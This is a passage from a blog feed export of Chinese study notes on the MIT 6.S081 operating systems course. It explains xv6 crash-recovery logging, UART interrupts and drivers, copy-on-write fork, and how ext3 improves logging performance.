简单的实现方式，之后在下节课我们会看到更加复杂的logging协议。不过所有的这些协议都遵循了writeaheadrule，也就是说在写入commit记录之前，你需要确保所有的写操作都在log中。在这个范围内，还有大量设计上的灵活性可以用来设计特定的logging协议。</p><p>XV6的log结构如往常一样也是极其的简单。我们在最开始有一个headerblock，也就是我们的commit record，里面包含了：</p><ul><li>数字n代表有效的log block的数量</li><li>每个log block的实际对应的block编号</li></ul><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MzMzZTZiNGU1YTVhYjRkZTY1OGMyZTA0NTY1M2Q5NzVfbUZ3OEpJZnVRWEZvT0NxRk43ek5hQmlKQ2k2WTdWVklfVG9rZW46UDU5d2JtWkhxb1JiQzd4cms1WmNEYWdpbjFmXzE2OTY1NzQ1MTg6MTY5NjU3ODExOF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><strong>关于crash的时候重启</strong></p><p>当系统crash并重启了，在XV6启动过程中做的一件事情就是调用initlog函数。initlog基本上就是调用recover_from_log函数。</p><p>ecover_from_log先调用read_head函数从磁盘中读取header，之后调用install_trans函数。这个函数之前在commit函数中也调用过，它就是读取logheader中的n，然后根据n将所有的logblock拷贝到文件系统的block中。recover_from_log在最后也会跟之前一样清除log。</p><p>这就是恢复的全部流程。如果我们在install_trans函数中又crash了，也不会有问题，因为之后再重启时，XV6会再次调用initlog函数，再调用recover_from_log来重新installlog。如果我们在commit之前crash了多次，在最终成功commit时，log可能会install多次。</p><h3 id="代码演示见文件系统一章节">代码演示(见文件系统一章节)</h3><h3 id="三个挑战"><strong>三个挑战</strong></h3><p>第一个是cacheeviction。假设transaction还在进行中，我们刚刚更新了block45，正要更新下一个block，而整个buffer cache都满了并且决定撤回block45。在buffer cache中撤回block 45意味着我们需要将其写入到磁盘的block45位置，这里会不会有问题？如果我们这么做了的话，会破坏什么规则吗？是的，如果将block45写入到磁盘之后发生了crash，就会破坏transaction的原子性。这里也破坏了前面说过的writeahead rule，write aheadrule的含义是，你需要先将所有的block写入到log中，之后才能实际的更新文件系统block。所以buffercache不能撤回任何还位于log的block。</p><p>前面在介绍log_write函数时，其中调用了一个叫做bpin的函数，这个函数的作用就如它的名字一样，将block固定在buffercache中。它是通过给blockcache增加引用计数来避免cache撤回对应的block。在之前（注，详见14.6）我们看过，如果引用计数不为0，那么buffercache是不会撤回blockcache的。相应的在将来的某个时间，所有的数据都写入到了log中，我们可以在cache中unpinblock（注，在15.5中的install_trans函数中会有unpin，因为这时block已经写入到了log中）。所以这是第一个复杂的地方，我们需要pin/unpinbuffer cache中的block。</p><p>第二个挑战是，文件系统操作必须适配log的大小。<strong>在XV6中，总共有30个logblock</strong>（注，详见14.3）。当然我们可以提升log的尺寸，在真实的文件系统中会有大得多的log空间。但是无所谓啦，不管log多大，文件系统操作必须能放在log空间中。<strong>如果一个文件系统操作尝试写入超过30个block，那么意味着部分内容需要直接写到文件系统区域，而这是不被允许的，因为这违背了writeahead rule。所以所有的文件系统操作都必须适配log的大小。</strong></p><p>为什么XV6的log大小是30？因为30比任何一个文件系统操作涉及的写操作数都大，Robert和我看了一下所有的文件系统操作，发现都远小于30，所以就将XV6的log大小设为30。我们目前看过的一些文件系统操作，例如创建一个文件只包含了写5个block。实际上大部分文件系统操作只会写几个block。你们可以想到什么样的文件系统操作会写很多很多个block吗？是的，写一个大文件。如果我们调用write系统调用并传入1M字节的数据，这对应了写1000个block，这看起来会有很严重的问题，因为这破坏了我们刚刚说的“文件系统操作必须适配log的大小”这条规则。如果写入的block数超过了30，那么一个写操作会被分割成多个小一些的写操作。这里整个写操作不是原子的，但是这还好啦，因为write系统调用的语义并不要求所有1000个block都是原子的写入，它只要求我们不要损坏文件系统。所以XV6会将一个大的写操作分割成多个小的写操作，每一个小的写操作通过独立的transaction写入。这样文件系统本身不会陷入不正确的状态中。</p><p>最后一个要讨论的挑战是<strong>并发文件系统调用</strong>。让我先来解释一下这里会有什么问题，再看对应的解决方案。假设我们有一段log，和两个并发的执行的transaction，其中transactiont0在log的前半段记录，transactiont1在log的后半段记录。可能我们用完了log空间，但是任何一个transaction都还没完成。</p><p>现在我们能提交任何一个transaction吗？我们不能，因为这样的话我们就提交了一个部分完成的transaction，这违背了writeaheadrule，log本身也没有起到应该的作用。所以必须要保证多个并发transaction加在一起也适配log的大小。所以当我们还没有完成一个文件系统操作时，我们必须在确保可能写入的总的log数小于log区域的大小的前提下，才允许另一个文件系统操作开始。</p><p>XV6通过限制并发文件系统操作的个数来实现这一点。在begin_op中，我们会检查当前有多少个文件系统操作正在进行。如果有太多正在进行的文件系统操作，我们会通过sleep停止当前文件系统操作的运行，并等待所有其他所有的文件系统操作都执行完并commit之后再唤醒。这里的其他所有文件系统操作都会一起commit。有的时候这被称为groupcommit，因为这里将多个操作像一个大的transaction一样提交了，这里的多个操作要么全部发生了，要么全部没有发生。</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Intertupt</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/interrupt/main/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/interrupt/main/</url>
    
    <content type="html"><![CDATA[<p>背景知识：</p><p>通常一个简易的RISC-V处理器由三大块构成，一是执行指令流水的core，二是平台中断控制的PLIC，三是负责调试的DM（debugmodule）</p><p>PLIC(platform-level interruptcontroller)，平台级中断控制器。用来将外部的全局中断请求处理后转至中断目标。PLIC理论上支持1023个外部中断源和15872个上下文，但真实设计实现时一般不需要这么多。</p><p>通俗一点理解，PLIC就像公司的秘书，中断目标就像公司的老板，外部中断请求就像要拜访老板的访客。因为访客很多，所以如果访客不经任何处理全挤在老板的办公室里，会很嘈杂。因此，老板就招了一个秘书，并规定，所有的访客在秘书那里登记，然后秘书根据访客的重要性，对访客进行排序，每次只将优先级最高的访客通知给老板，以此来提高办公效率。</p><p>通常一个系统（平台）中会有很多外设，而每个外设都有一个或多个中断请求，在系统正常工作中处理器内核负责处理（服务）所有外设中断，但通常这些外设中断并不直接接入内核，而是经平台中断控制器（PLIC）处理后再转至内核处理。</p><p>PLIC将所有外部中断源的中断请求汇总起来，并根据用户配置的中断优先级，中断使能，中断目标阈值等信息进行处理，最终将仲裁”胜利“的（最高优先级且大于中断目标阈值）外部中断源的中断请求转至给中断目标处理。因这些配置信息由用户配置，所以PLIC也可以理解为可编程的中断控制器。</p><p>https://zhuanlan.zhihu.com/p/628296038</p><h3 id="什么是中断">什么是中断？</h3><p><strong>中断对应的场景很简单，就是硬件想要得到操作系统的关注。</strong>例如网卡收到了一个packet，网卡会生成一个中断；用户通过键盘按下了一个按键，键盘会产生一个中断。操作系统需要做的是，保存当前的工作，处理中断，处理完成之后再恢复之前的工作。这里的保存和恢复工作，与我们之前看到的系统调用过程非常相似。<strong>所以系统调用，pagefault，中断，都使用相同的机制</strong>。</p><p>但是中断又有一些不一样的地方，这就是为什么我们要花一节课的时间来讲它。中断与系统调用主要有3个小的差别：</p><ol type="1"><li>asynchronous。当硬件生成中断时，Interrupthandler与当前运行的进程在CPU上没有任何关联。但如果是系统调用的话，系统调用发生在运行进程的context下。</li><li>concurrency。我们这节课会稍微介绍并发，在下一节课，我们会介绍更多并发相关的内容。对于中断来说，CPU和生成中断的设备是并行的在运行。网卡自己独立的处理来自网络的packet，然后在某个时间点产生中断，但是同时，CPU也在运行。所以我们在CPU和设备之间是真正的并行的，我们必须管理这里的并行。</li><li>programdevice。我们这节课主要关注外部设备，例如网卡，UART，而这些设备需要被编程。每个设备都有一个编程手册，就像RISC-V有一个包含了指令和寄存器的手册一样。设备的编程手册包含了它有什么样的寄存器，它能执行什么样的操作，在读写控制寄存器的时候，设备会如何响应。不过通常来说，设备的手册不如RISC-V的手册清晰，这会使得对于设备的编程会更加复杂。</li></ol><h3 id="中断来自于哪里">中断来自于哪里？</h3><p>外中断：各种设备</p><p>内中断：时钟中断，exception</p><h3 id="驱动程序">驱动程序</h3><p>通常来说，<strong>管理设备的代码称为驱动</strong>，所有的驱动都在内核中。我们今天要看的是UART设备的驱动，代码在uart.c文件中。如果我们查看代码的结构，我们可以发现大部分驱动都分为两个部分，bottom/top。</p><p><strong>bottom部分通常是Interrupthandler。当一个中断送到了CPU，并且CPU设置接收这个中断，CPU会调用相应的Interrupthandler。Interrupthandler并不运行在任何特定进程的context中，它只是处理中断。</strong></p><p>top部分，是用户进程，或者内核的其他部分<strong>调用的接口</strong>。对于UART来说，这里有read/write接口，这些接口可以被更高层级的代码调用。</p><p>通常情况下，驱动中会有一些队列（或者说buffer），top部分的代码会从队列中读写数据，而Interrupthandler（bottom部分）同时也会向队列中读写数据。这里的队列可以将并行运行的设备和CPU解耦开来。</p><p>通常对于Interrupthandler来说存在一些限制，因为它并没有运行在任何进程的context中，所以进程的pagetable并不知道该从哪个地址读写数据，也就无法直接从Interrupthandler读写数据。驱动的top部分通常与用户的进程交互，并进行数据的读写。我们后面会看更多的细节，这里是一个驱动的典型架构。</p><h3 id="设备编程基础">设备编程基础</h3><p>SIE: 管理程序中的中断寄存器，one bit for E(外部中断), S(软件中断),T(时钟中断)</p><p>SSTATUS: bit for enable/disable</p><p>STP: interrupt pending(中断挂起寄存器)</p><p>SSCAUSE：造成中断的原因</p><p>STVEC：它会保存当trap，pagefault或者中断发生时，CPU运行的用户程序的程序计数器，这样才能在稍后恢复程序的运行。</p><h3 id="top">Top</h3><p>init.c[main]:首先这个进程的main函数创建了一个代表Console的设备。这里通过mknod操作创建了console设备。因为这是第一个打开的文件，所以这里的文件描述符0。之后通过dup创建stdout和stderr。这里实际上通过复制文件描述符0，得到了另外两个文件描述符1，2。最终文件描述符0，1，2都用来代表Console。</p><p>Getcmd: fprintf(2, '$ );</p><p>=&gt; write</p><p>=&gt; sys_write</p><p>=&gt;filewrite：在filewrite函数中首先会判断文件描述符的类型。mknod生成的文件描述符属于设备（FD_DEVICE），而对于设备类型的文件描述符，我们会为这个特定的设备执行设备相应的write函数。因为我们现在的设备是Console，所以我们知道这里会调用console.c中的consolewrite函数。</p><p>Consolewrite:这里先通过either_copyin将字符拷入，之后调用uartputc函数。uartputc函数将字符写入给UART设备，所以你可以认为consolewrite是一个UART驱动的top部分。uart.c文件中的uartputc函数会实际的打印字符。</p><p>Uartputc:uartputc函数会稍微有趣一些。在UART的内部会有一个buffer用来发送数据，buffer的大小是32个字符。同时还有一个为consumer提供的读指针和为producer提供的写指针，来构建一个环形的buffer（注，或者可以认为是环形队列）,在我们的例子中，Shell是producer，所以需要调用uartputc函数。在函数中第一件事情是判断环形buffer是否已经满了。如果读写指针相同，那么buffer是空的，如果写指针加1等于读指针，那么buffer满了。当buffer是满的时候，向其写入数据是没有意义的，所以这里会sleep一段时间，将CPU出让给其他进程。当然，对于我们来说，buffer必然不是满的，因为提示符“$”是我们送出的第一个字符。所以代码会走到else，字符会被送到buffer中，更新写指针，之后再调用uartstart函数。</p><p>Uart:uartstart就是通知设备执行操作。首先是检查当前设备是否空闲，如果空闲的话，我们会从buffer中读出数据，然后将数据写入到THR（TransmissionHoldingRegister）发送寄存器。这里相当于告诉设备，我这里有一个字节需要你来发送。一旦数据送到了设备，系统调用会返回，用户应用程序Shell就可以继续执行。这里从内核返回到用户空间的机制与lec06的trap机制是一样的。</p><h3 id="bottom">Bottom</h3><p>在我们向Console输出字符时，如果发生了中断，RISC-V会做什么操作？我们之前已经在SSTATUS寄存器中打开了中断，所以处理器会被中断。假设键盘生成了一个中断并且发向了PLIC，PLIC会将中断路由给一个特定的CPU核，并且如果这个CPU核设置了SIE寄存器的Ebit（注，针对外部中断的bit位），那么会发生以下事情：</p><p>首先，会清除SIE寄存器相应的bit，这样可以阻止CPU核被其他中断打扰，该CPU核可以专心处理当前中断。处理完成之后，可以再次恢复SIE寄存器相应的bit。</p><p>之后，会设置SEPC寄存器为当前的程序计数器。我们假设Shell正在用户空间运行，突然来了一个中断，那么当前Shell的程序计数器会被保存。</p><p>之后，要保存当前的mode。在我们的例子里面，因为当前运行的是Shell程序，所以会记录usermode。</p><p>再将mode设置为Supervisor mode。</p><p>最后将程序计数器的值设置成STVEC的值。（注，STVEC用来保存trap处理程序的地址，详见lec06）在XV6中，STVEC保存的要么是uservec或者kernelvec函数的地址，具体取决于发生中断时程序运行是在用户空间还是内核空间。在我们的例子中，Shell运行在用户空间，所以STVEC保存的是uservec函数的地址。而从之前的课程我们可以知道uservec函数会调用usertrap函数。所以最终，我们在usertrap函数中。我们这节课不会介绍trap过程中的拷贝，恢复过程，因为在之前的课程中已经详细的介绍过了。</p><p>在trap.c的devintr函数中，首先会通过SCAUSE寄存器判断当前中断是否是来自于外设的中断。如果是的话，再调用plic_claim函数来获取中断。</p><p>plic_claim函数位于plic.c文件中。在这个函数中，当前CPU核会告知PLIC，自己要处理中断，PLIC_SCLAIM会将中断号返回，对于UART来说，返回的中断号是10</p><p>所以代码会直接运行到uartstart函数，这个函数会将Shell存储在buffer中的任意字符送出。实际上在提示符“<spanclass="math inline">\(”之后，Shell还会输出一个空格字符，write系统调用可以在UART发送提示符“\)</span>”的同时，并发的将空格字符写入到buffer中。所以UART的发送中断触发时，可以发现在buffer中还有一个空格字符，之后会将这个空格字符送出。</p><h3 id="caseshell提示符的代码跟踪">Case：shell提示符的代码跟踪</h3><p>当XV6启动时，Shell会输出提示符“$”，如果我们在键盘上输入ls，最终可以看到“$ls”。我们接下来通过研究Console是如何显示出“$ls”，来看一下设备中断是如何工作的。</p><p>实际上“$ ”和“ls”还不太一样，“$”是Shell程序的输出，而“ls”是用户通过键盘输入之后再显示出来的。</p><p>对于“$”来说，实际上就是设备会将字符传输给UART的寄存器，UART之后会在发送完字符之后产生一个中断。在QEMU中，模拟的线路的另一端会有另一个UART芯片（模拟的），这个UART芯片连接到了虚拟的Console，它会进一步将“$”显示在console上.</p><p>另一方面，对于“ls”，这是用户输入的字符。键盘连接到了UART的输入线路，当你在键盘上按下一个按键，UART芯片会将按键字符通过串口线发送到另一端的UART芯片。另一端的UART芯片先将数据bit合并成一个Byte，之后再产生一个中断，并告诉处理器说这里有一个来自于键盘的字符。之后Interrupthandler会处理来自于UART的字符。我们接下来会深入通过这两部分来弄清楚这里是如何工作的。</p><h3 id="中断与并发">中断与并发</h3><ol type="1"><li>device + cpu run in parallel (produce/consumerparallelism)：设备与CPU是并行运行的。例如当UART向Console发送字符的时候，CPU会返回执行Shell，而Shell可能会再执行一次系统调用，向buffer中写入另一个字符，这些都是在并行的执行。这里的并行称为producer-consumer并行。，</li><li>interrput stops the currentprogram：中断可以发生在任何时候，这意味可能在内核空间发生中断，所以即使是内核也不是一定会同步执行每条命令的，所以必须在某段时间内禁用中断，从而使得部分操作是原子的，</li><li>驱动的并行性（驱动的上部分和下部分是并行的），在打印完<spanclass="math inline">\(之后，shell会再次调用write系统调用，同时驱动顶部也在处理\)</span>之后的空格，但是在另一个核心，可能在处理来自UART的中断（其实就是一份代码可能同时运行在不同的核心上，而同一个设备是共享一个buffer的，为了让同一时间内只允许一个cpu处理buffer，使用锁）管理这种方式就是使用锁，</li></ol><p>当用户在终端上输入的时候，一方面触发系统调用read =&gt; fileread =&gt;如果这个时候缓冲区没有字符则sleep，否则从从缓冲区读取；另一方面用户输入字符这将导致字符发生到电路板上的UART芯片，通过PLIC到达某个核心，核心将接受中断，同时uart驱动自己会把设备传输到的字符放入缓冲区，唤醒等待区的进程，在这里即用户触发的系统调用</p><p>如果两个指针相等，那么buffer是空的。当Shell调用uartputc函数时，会将字符，例如提示符“$”，写入到写指针的位置，并将写指针加1。这就是producer对于buffer的操作。这是驱动中的非常常见的典型现象。如你们所见的，在驱动中会有一个buffer，在我们之前的例子中，buffer是32字节大小。并且有两个指针，分别是读指针和写指针。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=OTRjNmJkMDJmMGRhYmIxMzZjNTc5NTVkMjY5Mjc2YzRfSWM1WUJEQ2t6UjMySkFaeXFnQ2dXbHc1dnJMVm40WDhfVG9rZW46Q0NNc2JEZXgzb0hjVnJ4YThoVmM3YnkxbmJkXzE2OTY1NzQ3MjQ6MTY5NjU3ODMyNF9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>producer可以一直写入数据，直到写指针 +1等于读指针，因为这时，buffer已经满了。当buffer满了的时候，producer必须停止运行。我们之前在uartputc函数中看过，如果buffer满了，代码会sleep，暂时搁置Shell并运行其他的进程。</p><p>Interrupthandler，也就是uartintr函数，在这个场景下是consumer，每当有一个中断，并且读指针落后于写指针，uartintr函数就会从读指针中读取一个字符再通过UART设备发送，并且将读指针加1。当读指针追上写指针，也就是两个指针相等的时候，buffer为空，这时就不用做任何操作</p><blockquote><p>学生提问：这里的buffer对于所有的CPU核都是共享的吗？</p><p>Frans教授：这里的buffer存在于内存中，并且只有一份，所以，所有的CPU核都并行的与这一份数据交互。所以我们才需要lock。</p><p>学生提问：对于uartputc中的sleep，它怎么知道应该让Shell去sleep？</p><p>Frans教授：sleep会将当前在运行的进程存放于sleep数据中。它传入的参数是需要等待的信号，在这个例子中传入的是uart_tx_r的地址。在uartstart函数中，一旦buffer中有了空间，会调用与sleep对应的函数wakeup，传入的也是uart_tx_r的地址。任何等待在这个地址的进程都会被唤醒。有时候这种机制被称为conditionalsynchronization。</p></blockquote><h3 id="中断的发展历史"><strong>中断的发展历史</strong></h3><h3 id="中断发展历史">中断发展历史</h3><p>Unix:在以前比较简单的系统中，中断很快，有什么重要的工作要做，直接中断即可</p><p>Now：很慢，因为中断需要保持寄存器，而且现代设备越来越复杂</p><p>对于高速设置，设备来不及中断，解决方案：pulling，比如千兆以太网网卡设备，那么网卡美妙产生大约150w个包。这意味着对每个包产生一个中断，平均1us一次中断。</p><p>轮询的方式，有个缺点，就是如果设备太慢的话，cpu自旋，浪费了cpu周期；太快的话，节省了内核切换成本</p><p>CPU spins until device has data，but wastes cpu cycles，</p><p>现代高级cpu会动态地在轮询和中断状态直接切换</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Virtual Memory</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/virtualmem/virtualmem/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/virtualmem/virtualmem/</url>
    
    <content type="html"><![CDATA[<p>如果按传统的做法，会直接将父进程的数据拷贝到子进程中，拷贝完之后，父进程和子进程之间的数据段和堆栈是相互独立的。</p><p>但是，以我们的使用经验来说：往往子进程都会执行exec()来做自己想要实现的功能。</p><p>所以，如果按照上面的做法的话，创建子进程时复制过去的数据是没用的(因为子进程执行exec()，原有的数据会被清空)既然很多时候复制给子进程的数据是无效的，于是就有了Copy OnWrite这项技术了，原理也很简单：</p><p>fork创建出的子进程，与父进程共享内存空间。也就是说，如果子进程不对内存空间进行写入操作的话，内存空间中的数据并不会复制给子进程，这样创建子进程的速度就很快了！(不用复制，直接引用父进程的物理空间)。并且如果在fork函数返回之后，子进程第一时间exec一个新的可执行映像，那么也不会浪费时间和内存空间了。另外的表达方式：</p><p>在fork之后exec之前两个进程用的是相同的物理空间（内存区），子进程的代码段、数据段、堆栈都是指向父进程的物理空间，也就是说，两者的虚拟空间不同，但其对应的物理空间是同一个。</p><p>当父子进程中有更改相应段的行为发生时，再为子进程相应的段分配物理空间。</p><p>如果不是因为exec，内核会给子进程的数据段、堆栈段分配相应的物理空间（至此两者有各自的进程空间，互不影响），而代码段继续共享父进程的物理空间（两者的代码完全相同）。</p><p>而如果是因为exec，由于两者执行的代码不同，子进程的代码段也会分配单独的物理空间。</p><p>Copy On Write技术实现原理：</p><p>fork()之后，kernel把父进程中所有的内存页的权限都设为read-only，然后子进程的地址空间指向父进程。当父子进程都只读内存时，相安无事。当其中某个进程写内存时，CPU硬件检测到内存页是read-only的，于是触发页异常中断（page-fault），陷入kernel的一个中断例程。中断例程中，kernel就会把触发的异常的页复制一份，于是父子进程各自持有独立的一份。</p><p>Copy On Write技术好处是什么？</p><p>COW技术可减少分配和复制大量资源时带来的瞬间延时。COW技术可减少不必要的资源分配。比如fork进程时，并不是所有的页面都需要复制，父进程的代码段和只读数据段都不被允许修改，所以无需复制。Copy On Write技术缺点是什么？</p><p>如果在fork()之后，父子进程都还需要继续进行写操作，那么会产生大量的分页错误(页异常中断page-fault)，这样就得不偿失。几句话总结Linux的Copy On Write技术：</p><p>fork出的子进程共享父进程的物理空间，当父子进程有内存写入操作时，read-only内存页发生中断，将触发的异常的内存页复制一份(其余的页还是共享父进程的)。fork出的子进程功能实现和父进程是一样的。如果有需要，我们会用exec()把当前进程映像替换成新的进程文件，完成自己想要实现的功能。</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>File system Performance</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/filesys-performance/main/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/filesys-performance/main/</url>
    
    <content type="html"><![CDATA[<p>首先来回顾一下XV6的logging系统。我们有一个磁盘用来存储XV6的文件系统，你可以认为磁盘分为了两个部分：</p><p>首先是文件系统目录的树结构，以root目录为根节点，往下可能有其他的目录，我们可以认为目录结构就是一个树状的数据结构。假设root目录下有两个子目录D1和D2，D1目录下有两个文件F1和F2，每个文件又包含了一些block。除此之外，还有一些其他并非是树状结构的数据，比如bitmap表明了每一个datablock是空闲的还是已经被分配了。inode，目录内容，bitmapblock，我们将会称之为metadatablock（注，Frans和Robert在这里可能有些概念不统一，对于Frans来说，目录内容应该也属于文件内容，目录是一种特殊的文件，详见14.3；而对于Robert来说，目录内容是metadata。），另一类就是持有了文件内容的block，或者叫datablock。</p><p>除了文件系统之外，XV6在磁盘最开始的位置还有一段log。XV6的log相对来说比较简单，它有headerblock，之后是一些包含了有变更的文件系统block，这里可以是metadatablock也可以是data block。header block会记录之后的每一个logblock应该属于文件系统中哪个block，假设第一个log block属于block17，第二个属于block 29。</p><p>在计算机上，我们会有一些用户程序调用write/create系统调用来修改文件系统。在内核中存在blockcache，最初write请求会被发到block cache。blockcache就是磁盘中block在内存中的拷贝，所以最初对于文件block或者inode的更新走到了blockcache。</p><p>在write系统调用的最后，这些更新都被拷贝到了log中，之后我们会更新headerblock的计数来表明当前的transaction已经结束了。在文件系统的代码中，任何修改了文件系统的系统调用函数中，某个位置会有begin_op，表明马上就要进行一系列对于文件系统的更新了，不过在完成所有的更新之前，不要执行任何一个更新。在begin_op之后是一系列的read/write操作。最后是end_op，用来告诉文件系统现在已经完成了所有write操作。所以在begin_op和end_op之间，所有的writeblock操作只会走到blockcache中。当系统调用走到了end_op函数，文件系统会将修改过的blockcache拷贝到log中。</p><p>在拷贝完成之后，文件系统会将修改过的block数量，通过一个磁盘写操作写入到log的headerblock，这次写入被称为commit point。在commitpoint之前，如果发生了crash，在重启时，整个transaction的所有写磁盘操作最后都不会应用。在commitpoint之后，即使立即发生了crash，重启时恢复软件会发现在logheader中记录的修改过的block数量不为0，接下来就会将logheader中记录的所有block，从log区域写入到文件系统区域。</p><p>这里实际上使得系统调用中位于begin_op和end_op之间的所有写操作在面对crash时具备原子性。也就是说，要么文件系统在crash之前更新了log的headerblock，这样所有的写操作都能生效；要么crash发生在文件系统更新log的headerblock之前，这样没有一个写操作能生效。</p><p>在crash并重启时，必须有一些恢复软件能读取log的headerblock，并判断里面是否记录了未被应用的block编号，如果有的话，需要写（也有可能是重写）logblock到文件系统中对应的位置；如果没有的话，恢复软件什么也不用做。</p><p>这里有几个超级重要的点，不仅针对XV6，对于大部分logging系统都适用：</p><ul><li>包括XV6在内的所有logging系统，都需要遵守write aheadrule。这里的意思是，任何时候如果一堆写操作需要具备原子性，系统需要先将所有的写操作记录在log中，之后才能将这些写操作应用到文件系统的实际位置。也就是说，我们需要预先在log中定义好所有需要具备原子性的更新，之后才能应用这些更新。writeahead rule是logging能实现故障恢复的基础。write aheadrule使得一系列的更新在面对crash时具备了原子性。</li><li>另一点是，XV6对于不同的系统调用复用的是同一段log空间，但是直到log中所有的写操作被更新到文件系统之前，我们都不能释放或者重用log。我将这个规则称为freeingrule，它表明我们不能覆盖或者重用log空间，直到保存了transaction所有更新的这段log，都已经反应在了文件系统中。</li></ul><p>所以在XV6中，end_op做了大量的工作，首先是将所有的block记录在log中，之后是更新logheader。在没有crash的正常情况，文件系统需要再次将所有的block写入到磁盘的文件系统中。磁盘中的文件系统更新完成之后，XV6文件系统还需要删除headerblock记录的变更了的block数量，以表明transaction已经完成了，之后就可以重用log空间。</p><p>在向log写入任何新内容之前，删除headerblock中记录的block数量也很重要。因为你不会想要在headerblock中记录的还是前一个transaction的信息，而log中记录的又是一个新的transaction的数据。可以假设新的transaction对应的是与之前不同的block编号的数据，这样的话，在crash重启时，log中的数据会被写入到之前记录的旧的block编号位置。所以我们必须要先清除headerblock。</p><p>freeingrule的意思就是，在从log中删除一个transaction之前，我们必须将所有log中的所有block都写到文件系统中。</p><p>这些规则使得，就算一个文件系统更新可能会复杂且包含多个写操作，但是每次更新都是原子的，在crash并重启之后，要么所有的写操作都生效，要么没有写操作能生效。</p><p>要介绍Linux的logging方案，就需要了解XV6的logging有什么问题？为什么Linux不使用与XV6完全一样的logging方案？这里的回答简单来说就是XV6的logging太慢了。</p><p>XV6中的任何一个例如create/write的系统调用，需要在整个transaction完成之后才能返回。所以在创建文件的系统调用返回到用户空间之前，它需要完成所有end_op包含的内容，这包括了：</p><ul><li>将所有更新了的block写入到log</li><li>更新header block</li><li>将log中的所有block写回到文件系统分区中</li><li>清除header block</li></ul><p>之后才能从系统调用中返回。在任何一个文件系统调用的commit过程中，不仅是占据了大量的时间，而且其他系统调用也不能对文件系统有任何的更新。所以这里的系统调用实际上是一次一个的发生，而每个系统调用需要许多个写磁盘的操作。这里每个系统调用需要等待它包含的所有写磁盘结束，对应的技术术语被称为synchronize。XV6的系统调用对于写磁盘操作来说是同步的（synchronized），所以它非常非常的慢。在使用机械硬盘时，它出奇的慢，因为每个写磁盘都需要花费10毫秒，而每个系统调用又包含了多个写磁盘操作。所以XV6每秒只能完成几个更改文件系统的系统调用。如果我们在SSD上运行XV6会快一些，但是离真正的高效还差得远。</p><p>另一件需要注意的更具体的事情是，在XV6的logging方案中，每个block都被写了两次。第一次写入到了log，第二次才写入到实际的位置。虽然这么做有它的原因，但是ext3可以一定程度上修复这个问题。</p><p>ext3是针对之前一种的文件系统（ext2）logging方案的修改，所以ext3就是在几乎不改变之前的ext2文件系统的前提下，在其上增加一层logging系统。所以某种程度来说，logging是一个容易升级的模块。</p><p>ext3的数据结构与XV6是类似的。在内存中，存在blockcache，这是一种write-back cache（注，区别于write-throughcache，指的是cache稍后才会同步到真正的后端）。blockcache中缓存了一些block，其中的一些是干净的数据，因为它们与磁盘上的数据是一致的；其他一些是脏数据，因为从磁盘读出来之后被修改过；有一些被固定在cache中，基于前面介绍的write-aheadrule和freeing rule，不被允许写回到磁盘中。</p><h3 id="ext3如何提升性能">ext3如何提升性能</h3><p>ext3通过3种方式提升了性能：</p><ul><li>首先，它提供了<strong>异步的（asynchronous）系统调用</strong>，也就是说系统调用在写入到磁盘之前就返回了，系统调用只会更新缓存在内存中的block，并不用等待写磁盘操作。不过它可能会等待读磁盘。</li><li>第二，它提供了<strong>批量执行（batching）的能力</strong>，可以将多个系统调用打包成一个transaction。</li><li>最后，它提供了<strong>并发（concurrency）</strong></li></ul><p>首先是异步的系统调用。这表示系统调用修改完位于缓存中的block之后就返回，并不会触发写磁盘。所以这里明显的优势就是系统调用能够快速的返回。同时它也使得I/O可以并行的运行，也就是说应用程序可以调用一些文件系统的系统调用，但是应用程序可以很快从系统调用中返回并继续运算，与此同时文件系统在后台会并行的完成之前的系统调用所要求的写磁盘操作。这被称为I/Oconcurrency，如果没有异步系统调用，很难获得I/Oconcurrency，或者说很难同时进行磁盘操作和应用程序运算，因为同步系统调用中，应用程序总是要等待磁盘操作结束才能从系统调用中返回。</p><p>另一个异步系统调用带来的好处是，它使得大量的批量执行变得容易。</p><p>异步系统调用的缺点是系统调用的返回并不能表示系统调用应该完成的工作实际完成了。举个例子，如果你创建了一个文件并写了一些数据然后关闭文件并在console向用户输出done，最后你把电脑的电给断了。尽管所有的系统调用都完成了，程序也输出了done，但是在你重启之后，你的数据并不一定存在。这意味着，在异步系统调用的世界里，如果应用程序关心可能发生的crash，那么应用程序代码应该更加的小心。这在XV6并不是什么大事，因为如果XV6中的write返回了，那么数据就在磁盘上，crash之后也还在。而ext3中，如果write返回了，你完全不能确定crash之后数据还在不在。所以一些应用程序的代码应该仔细编写，例如对于数据库，对于文本编辑器，我如果写了一个文件，我不想在我写文件过程断电然后再重启之后看到的是垃圾文件或者不完整的文件，我想看到的要么是旧的文件，要么是新的文件。</p><p>所以文件系统对于这类应用程序也提供了一些工具以确保在crash之后可以有预期的结果。这里的工具是一个系统调用，叫做fsync，所有的UNIX都有这个系统调用。这个系统调用接收一个文件描述符作为参数，它会告诉文件系统去完成所有的与该文件相关的写磁盘操作，在所有的数据都确认写入到磁盘之后，fsync才会返回。所以如果你查看数据库，文本编辑器或者一些非常关心文件数据的应用程序的源代码，你将会看到精心放置的对于fsync的调用。fsync可以帮助解决异步系统调用的问题。对于大部分程序，例如编译器，如果crash了编译器的输出丢失了其实没什么，所以许多程序并不会调用fsync，并且乐于获得异步系统调用带来的高性能。</p><blockquote><p